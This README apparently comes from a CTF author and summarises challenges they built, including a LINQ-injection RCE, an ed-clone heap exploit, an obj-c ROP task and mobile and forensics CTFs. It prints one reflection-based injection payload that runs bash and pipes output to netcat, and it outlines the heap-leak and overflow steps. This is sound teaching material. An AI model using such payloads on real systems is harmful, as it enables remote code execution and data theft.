# ctf_challenges

## CSAW CTF 2016 Finals

### [linq_to_the_present](https://github.com/osirislab/CSAW-CTF-2016-Finals/tree/master/Web/linq_to_the_present)

This was basically SQL Injection in Linq which, unfortunately, gives you RCE.

```
"".GetType().Assembly.GetType("System.AppDomain").GetMethods()[18].Invoke("".GetType().Assembly.GetType("System.AppDomain").GetProperty("CurrentDomain").GetValue(null), "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;System.Diagnostics.Process".Split(";".ToCharArray())).GetType().GetMethods()[80].Invoke(null, "bash;-c 'ls | nc 0 9001'".Split(";".ToCharArray()))
```

### [Ed, Edd, and Eddie](https://github.com/osirislab/CSAW-CTF-2016-Finals/tree/master/Pwn/Ed-Edd-Eddie)

An ed, [the standard editor](http://wiki.c2.com/?EdIsTheStandardTextEditor), clone but without the easy `!/bin/sh` shellcode.

This challenge did not require any memory corruption. The goal of this challenge was to make people understand how to use ed, heh.

1) Use ed commands to load the ed binary into ed and print it out
2) Join two lines so that the length becomes [out of sync](https://github.com/osirislab/CSAW-CTF-2016-Finals/blob/master/Pwn/Ed-Edd-Eddie/ed.c#L227)
3) Allocate some strings on the heap
4) Since the program thinks the size of the line is really big (as a result of a lot of subtractions being done to the line length), we can search for all ascii chars (0-255) using find and parse out the results to essentially leak the heap
5) From the heap leak, you can pull the filename which was randomly generated
6) Put payload file path on the heap
7) [Overflow the mark table](https://github.com/osirislab/CSAW-CTF-2016-Finals/blob/master/Pwn/Ed-Edd-Eddie/ed.c#L253) until you can change the `can_save` and `filename`.
8) Create a stripped down shared object with shellcode
9) Now that we know the name of the file, we can write our payload to it and load it to execute our shellcode

[ed.py](https://github.com/osirislab/CSAW-CTF-2016-Finals/blob/master/Pwn/Ed-Edd-Eddie/ed.py)

## CSAW CTF 2018 Quals

### [turtles](https://github.com/osirislab/CSAW-CTF-2018-Quals/tree/master/pwn/turtles)

Pretty straight forward ROP challenge with a slight twist of having to craft a fake obj-c dtable method lookup. You can check out the internals of obj-c for linux [here](https://github.com/gcc-mirror/gcc/tree/41d6b10e96a1de98e90a7c0378437c3255814b16/libobjc).

[turtles.py](https://github.com/osirislab/CSAW-CTF-2018-Quals/blob/master/pwn/turtles/turtles.py)

## HackerOne CTFs

A collection of CTFs that I made for HackerOne which are mobile focused, with a bit of web.

* h1-702-2017 - iOS (5 challenges) and Android (5 challenges) crackmes with incremental difficulty
* h1-202-2018 - A single app which calls into server components. I really liked making this one a lot since you had to progress through the challenge to solve it all. It was also my first time using Retrofit and I really wish I knew about it earlier lol
* h1-702-2018 - Five Android challenges: 3 crackmes and 2 pwnables (Object deserialization and memory corruption). It was really cool to have pwnable challenges for mobile, but operations wise it was a [complete failure](https://breadchris.github.io/ctf/android/2018/06/10/android-pwnable-ctf-challenges/). I plan on making this a lot better for the next time.

[h1-ctf-archives](https://github.com/Hacker0x01/h1-ctf-archives)

## MCPS HSFs

A CTF that I put on annually for a school county for high schoolers. It is a mock digial forensics investigation which has flags, but is not a jeapordy style CTF. You have to make your way through the evidence and write a report on your findings. Based on the flags that the teams found, you can do an initial filtering of all the competitors and identify the top finishers. Then, you will read through their reports and identify the teams which successfully solved the crime and found the most incriminating evidence. I started running this when the high school event I used to run, CSAW HSF, unfortunately became a mind numbing jeapordy style CTF. I love this format and have plans to operationalize it so that schools across the world can run their own version of it.

* [MCPS HSF 2016](https://github.com/breadchris/MCPS-HSF-2017)
* [MCPS HSF 2017](https://github.com/breadchris/MCPS-HSF-2017)
* [MCPS HSF 2018](https://github.com/breadchris/mcps-hsf-2018)

